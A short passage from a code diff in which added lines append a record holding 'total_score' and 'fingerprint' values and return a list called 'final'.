+            "total_score": total_score,
+            "fingerprint": fingerprint,
+        })
+
+    return final
 
